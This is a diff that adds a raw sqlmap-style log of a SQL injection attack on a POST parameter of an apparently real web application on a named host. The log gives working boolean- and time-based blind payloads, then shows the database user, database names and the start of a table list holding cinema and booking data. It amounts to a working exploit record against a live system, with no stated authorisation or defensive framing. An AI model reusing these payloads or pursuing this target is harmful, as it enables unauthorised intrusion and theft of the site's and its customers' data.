@@ -1,0 +1,62 @@
+Parameter: operator (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: operator=ASIASOFT%' AND 1121=1121 AND '%'='&oprcode=GAS20H
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: operator=ASIASOFT%' AND SLEEP(5) AND '%'='&oprcode=GAS20H
+---
+[18:16:39] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[18:16:39] [INFO] the back-end DBMS is MySQL
+[18:16:39] [INFO] fetching banner
+[18:16:39] [INFO] resumed: 5.6.29-log
+web application technology: Apache 2.4.16, PHP 5.4.43
+back-end DBMS: MySQL >= 5.0.12
+banner:    '5.6.29-log'
+[18:16:39] [INFO] fetching current user
+[18:16:39] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[18:16:39] [INFO] retrieved: transaks_sis03@localhost
+current user:    'transaks_sis03@localhost'
+[18:17:03] [INFO] fetching current database
+[18:17:03] [INFO] retrieved: transaks_sis03
+current database:    'transaks_sis03'
+[18:17:18] [INFO] fetching database users password hashes
+[18:17:18] [INFO] fetching database users
+[18:17:18] [INFO] fetching number of database users
+[18:17:18] [INFO] retrieved: 1
+[18:17:19] [INFO] retrieved: 'transaks_sis03'@'localhost'
+[18:17:45] [INFO] fetching number of password hashes for user 'transaks_sis03'
+[18:17:45] [INFO] retrieved: 
+[18:17:46] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                    
+[18:17:50] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+
+[18:17:50] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[18:17:50] [WARNING] unable to retrieve the number of password hashes for user 'transaks_sis03'
+[18:17:50] [ERROR] unable to retrieve the password hashes for the database users (probably because the session user has no read privileges over the relevant system database table)
+[18:17:50] [INFO] fetching database names
+[18:17:50] [INFO] fetching number of databases
+[18:17:50] [INFO] resumed: 3
+[18:17:50] [INFO] resumed: information_schema
+[18:17:50] [INFO] resumed: transaks_bustravel
+[18:17:50] [INFO] resumed: transaks_sis03
+available databases [3]:
+[*] information_schema
+[*] transaks_bustrave
+[*] transaks_sis03
+
+
+hostname:    'server.klikmbc.co.id'
+
+Database: transaks_sis03
+[168 tables]
++--------------------------------------+
+| tbl_bioskop_images                   |
+| tbl_bioskop_logs                     |
+| tbl_biskop_CinemaxxCinemaList        |
+| tbl_biskop_CinemaxxCityData          |
+| tbl_biskop_CinemaxxMovieDetail       |
+| tbl_biskop_CinemaxxReslog            |
+| tbl_biskop_cinemaid                  |
+| tbl_biskop_moviedetail               |
+| tbl_booking                          |
